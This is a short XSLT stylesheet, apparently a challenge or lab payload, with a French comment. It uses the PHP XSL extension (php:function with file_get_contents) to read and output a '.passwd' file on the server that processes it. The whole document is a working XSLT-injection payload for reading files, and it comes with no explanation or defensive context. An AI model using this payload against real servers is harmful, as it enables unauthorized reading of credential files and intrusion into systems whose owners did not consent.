<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
                xmlns:php="http://php.net/xsl" version="1.0">

    <xsl:template match="/">
        <!-- Utiliser une fonction PHP pour lire le fichier -->
        <xsl:value-of select="php:function('file_get_contents', '.passwd')"/>
    </xsl:template>
</xsl:stylesheet>
